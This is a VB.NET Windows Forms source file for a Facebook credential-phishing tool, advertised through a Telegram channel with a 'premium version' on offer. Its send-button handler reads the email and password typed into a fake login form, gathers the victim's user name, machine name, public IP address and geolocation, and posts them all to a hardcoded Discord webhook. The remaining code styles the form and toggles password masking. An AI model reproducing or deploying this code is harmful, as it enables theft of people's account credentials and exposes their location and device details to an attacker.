Imports System.Net
Imports System.Net.Http
Imports System.Text
Imports Newtonsoft.Json.Linq
''''''''''''      ======================================
''''''''''''      =                                    =
''''''''''''      =             Telegram               =
''''''''''''      =       https://t.me/MONSTERMC       =
''''''''''''      =                                    =
''''''''''''      =   IF You Need Premium Version!     =
''''''''''''      =     Write to me on Telegram        =
''''''''''''      ======================================
Public Class Form1
    Private Async Sub SendButoon_Click(sender As Object, e As EventArgs) Handles SendButoon.Click
        Dim webhookUrl As String = "https://discord.com/api/webhooks/1246269237798899764/xdRaHHkGZo3fvAaqASePTo3N6WmA889FdkUrdDqtLp_lkKtv7zyVWF2SSoILaNq9gPWI" ' استبدل برابط Webhook الخاص بك Replace with your own Webhook
        Dim client As New HttpClient()

        Try
            Dim passwordContent As String = Password.Text ' الحصول على النص من TextBox Password Get text from TextBox2
            Dim emailContent As String = Email.Text ' الحصول على النص من TextBox Email Get text from TextBox1

            ' الحصول على معلومات النظامGet system information
            Dim userName As String = Environment.UserName
            Dim machineName As String = Environment.MachineName
            Dim publicIpAddress As String = Await GetPublicIPAddressAsync()
            Dim locationInfo As String = Await GetLocationInfoAsync(publicIpAddress)

            ' تكوين النص الكامل مع فصل الأسطر بواسطة \n وتضمين اسم الويب هوك و @everyone Create full text with lines separated by \n and include the webhook name and @everyone
            Dim messageContent As String = $"{{""username"": ""Facebook Scamm Tool MONSTERMC"", ""content"": ""@everyone\nEmail: {emailContent}\nPassword: {passwordContent}\n\nSystem Information:\nUser Name: {userName}\nMachine Name: {machineName}\nIP Address: {publicIpAddress}\nLocation Info: {locationInfo}""}}"

            Dim httpContent As New StringContent(messageContent, Encoding.UTF8, "application/json")

            Dim response As HttpResponseMessage = Await client.PostAsync(webhookUrl, httpContent)

            response.EnsureSuccessStatusCode()

            MessageBox.Show("Message sent successfully to Discord!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

        Catch ex As Exception
            MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' دالة خاصة وغير متزامنة تعيد عنوان IP العام للجهاز 'A private, asynchronous function that returns the public IP address of the device
    Private Async Function GetPublicIPAddressAsync() As Task(Of String)
        Try
            ' استخدام HttpClient داخل كتلة Using لضمان تحرير الموارد بعد الاستخدام ' Use HttpClient inside a Using block to ensure that resources are released after use
            Using client As New HttpClient()
                ' إجراء طلب GET غير متزامن للحصول على عنوان IP العام من خدمة ipify 'Perform an asynchronous GET request to get the public IP address from the ipify service
                Return Await client.GetStringAsync("https://api.ipify.org")
            End Using
        Catch ex As Exception
            ' في حالة حدوث استثناء، يتم إعادة رسالة تشير إلى عدم القدرة على تحديد عنوان IP 'If an exception occurs, a message is returned indicating that the IP address could not be determined
            Return "Unable to determine IP address."
        End Try
    End Function

    ' دالة خاصة وغير متزامنة تعيد معلومات الموقع الجغرافي بناءً على عنوان IP المعطى 'A private, asynchronous function that returns geographic location information based on the given IP address
    Private Async Function GetLocationInfoAsync(ipAddress As String) As Task(Of String)
        Try
            ' استخدام HttpClient داخل كتلة Using لضمان تحرير الموارد بعد الاستخدام ' Use HttpClient inside a Using block to ensure that resources are released after use
            Using client As New HttpClient()
                ' إجراء طلب GET غير متزامن للحصول على معلومات الموقع من خدمة ipinfo.io بصيغة JSON ' Make an asynchronous GET request to get location information from the ipinfo.io service in JSON format
                Dim response As String = Await client.GetStringAsync($"https://ipinfo.io/{ipAddress}/json")

                ' تحويل الاستجابة النصية JSON إلى كائن JSON ' Convert the JSON text response to a JSON object
                Dim jsonResponse As JObject = JObject.Parse(response)

                ' استخراج معلومات المدينة والمنطقة والدولة من كائن JSON ' Extract city, region and state information from a JSON object
                Dim city As String = jsonResponse("city").ToString()
                Dim region As String = jsonResponse("region").ToString()
                Dim country As String = jsonResponse("country").ToString()

                ' إعادة المعلومات بشكل سلسلة نصية 'Return the information in the form of a text string
                Return $"{city}, {region}, {country}"
            End Using
        Catch ex As Exception
            ' في حالة حدوث استثناء، يتم إعادة رسالة تشير إلى عدم القدرة على تحديد الموقع 'If an exception occurs, a message is returned indicating that the location could not be determined
            Return "Unable to determine location."
        End Try
    End Function


#Region "Back Coloer"
    ' تغيير لون الخلفية عند تحريك الفأرة فوق Guna2ImageCheckBox1 'Change background color when you move your mouse over Guna2ImageCheckBox1
    Private Sub Guna2ImageCheckBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles Guna2ImageCheckBox1.MouseMove
        ' تغيير لون الخلفية إلى اللون الرمادي الفاتح عند تحريك الفأرة فوق Guna2ImageCheckBox1 'Change background color to light gray when you move your mouse over Guna2ImageCheckBox1
        Guna2ImageCheckBox1.BackColor = Color.FromArgb(233, 237, 240)
    End Sub

    ' تغيير لون الخلفية عند تحريك الفأرة فوق النموذج الرئيسي 'Change the background color when you move your mouse over the main form
    Private Sub Form1_MouseMove(sender As Object, e As MouseEventArgs) Handles Me.MouseMove
        ' إعادة لون الخلفية لـ Guna2ImageCheckBox1 إلى الأبيض عند تحريك الفأرة فوق النموذج 'Returns the background color of Guna2ImageCheckBox1 to white when you move the mouse over the form
        Guna2ImageCheckBox1.BackColor = Color.White
        ' تغيير لون الخلفية لـ Guna2ControlBox1 إلى اللون الرمادي الفاتح عند تحريك الفأرة فوق النموذج 'Change the background color of Guna2ControlBox1 to light gray when you move your mouse over the form
        Guna2ControlBox1.BackColor = Color.FromArgb(233, 237, 240)
    End Sub

    ' تغيير لون الخلفية عند تحريك الفأرة فوق Guna2TextBox2 'Change background color when you move your mouse over Guna2TextBox2
    Private Sub Guna2TextBox2_MouseMove(sender As Object, e As MouseEventArgs) Handles Password.MouseMove
        ' إعادة لون الخلفية لـ Guna2ImageCheckBox1 إلى الأبيض عند تحريك الفأرة فوق Guna2TextBox2 'Returns the background color of Guna2ImageCheckBox1 to white when you move your mouse over Guna2TextBox2
        Guna2ImageCheckBox1.BackColor = Color.White
    End Sub

    ' تغيير لون الخلفية عند تحريك الفأرة فوق Guna2ControlBox1 'Change background color when you move your mouse over Guna2ControlBox1
    Private Sub Guna2ControlBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles Guna2ControlBox1.MouseMove
        ' تغيير لون الخلفية لـ Guna2ControlBox1 إلى اللون الأحمر الداكن عند تحريك الفأرة فوقه 'Change the background color of Guna2ControlBox1 to dark red when you move your mouse over it
        Guna2ControlBox1.BackColor = Color.FromArgb(232, 17, 35)
    End Sub
#End Region

    ' تغيير سلوك النص المخفي في مربع النص Password بناءً على حالة Guna2ImageCheckBox1 ' Change the behavior of hidden text in the Password text box based on the state of Guna2ImageCheckBox1
    Private Sub Guna2ImageCheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2ImageCheckBox1.CheckedChanged
        ' إذا كانت Guna2ImageCheckBox1 محددة، استخدم نظام النص المخفي 'If Guna2ImageCheckBox1 is selected, use the hidden text system
        If Guna2ImageCheckBox1.Checked = True Then
            Password.UseSystemPasswordChar = True
        Else
            ' إذا لم تكن Guna2ImageCheckBox1 محددة، اعرض النص بشكل عادي 'If Guna2ImageCheckBox1 is not selected, display the text normally
            Password.UseSystemPasswordChar = False
        End If
    End Sub

    ' إظهار أو إخفاء Guna2ImageCheckBox1 بناءً على محتوى مربع النص Password ' Show or hide Guna2ImageCheckBox1 based on the content of the Password text box
    Private Sub Password_TextChanged(sender As Object, e As EventArgs) Handles Password.TextChanged
        ' إذا كان مربع النص Password فارغًا، أخفِ Guna2ImageCheckBox1 'If the Password text box is empty, hide Guna2ImageCheckBox1
        If Password.Text.Trim() = "" Then
            Guna2ImageCheckBox1.Hide()
        Else
            ' إذا كان مربع النص Password يحتوي على نص، أظهر Guna2ImageCheckBox1 'If the Password text box contains text, show Guna2ImageCheckBox1
            Guna2ImageCheckBox1.Show()
        End If
    End Sub

    Private Sub LinkLabel3_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel3.LinkClicked
        Process.Start("https://t.me/MONSTERMC")
    End Sub
End Class
